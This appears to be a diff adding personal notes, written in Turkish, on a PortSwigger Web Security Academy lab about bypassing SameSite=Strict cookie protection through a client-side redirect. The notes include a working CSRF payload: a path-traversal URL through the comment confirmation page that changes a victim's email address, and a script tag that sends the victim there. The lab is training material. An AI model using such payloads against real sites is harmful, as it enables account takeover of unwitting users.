@@ -1,0 +1,30 @@
+Lab: SameSite Strict bypass via client-side redirect
+
+url: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
+
+
+
+Analiz:
+-- Sitede paketler pek güvenli değil herhangi bi güvenlik tokeni yok.
+-- Get methodunu kabul ediyor
+-- Fakat burda samesite değeri var bu yüzden sadece getin kabul edilmesi işimize yaramadı.
+-- bizde sitede gezintiye çıktık . bu gezintide otomotik bir yönlendirme sayfası keşfettik onun sayesinde belki
+samesite önlemini atlatabiliriz
+
+
+Zafiyet:
+
+-- Urlde postlara yorum yapğtığımız zaman bize onay sayfası veriyor ve bi süra sonra bizi geri atan sayfanın id değeri verilen kısmına keni gitmek istediğimz
+mevkiyi enjekte edersek site iiçinde gezdiğimiz için cookie yi kendisi ekler ve burdan sonrası zaten csrf101 dersi içeriği.
+
+
+Payload:
+
+--https://0a37009204fe72e28191433c00a5001c.web-security-academy.net/post/comment/confirmation?postId=3/../../my-account/change-email?email=xavyer%40ss.com%26submit=1 
+urlini kullnarak email adresi değiştirebildik. yani bunu uygun bir paket haline getirirsek soruyu çözeriz.
+
+
+<script>
+window.location="https://0a37009204fe72e28191433c00a5001c.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=killerr%40ss.com%26submit=1";
+</script>
+
